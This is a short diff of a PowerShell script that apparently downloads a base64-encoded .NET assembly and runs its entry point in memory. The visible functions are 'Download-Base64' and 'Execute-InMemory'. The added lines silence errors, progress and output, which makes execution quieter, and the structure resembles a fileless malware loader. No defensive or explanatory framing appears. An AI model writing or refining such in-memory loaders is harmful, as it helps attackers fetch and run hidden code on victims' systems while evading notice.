@@ -1,3 +1,7 @@
+$ErrorActionPreference = "SilentlyContinue"
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$ProgressPreference = 'SilentlyContinue'
+
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 function Download-Base64 {
@@ -61,7 +65,7 @@ function Execute-InMemory {
     
     $entryPoint = $script:mainAssembly.EntryPoint
     if ($entryPoint -ne $null) {
-        $entryPoint.Invoke($null, @())
+        $entryPoint.Invoke($null, @()) | Out-Null
     }
 }
 
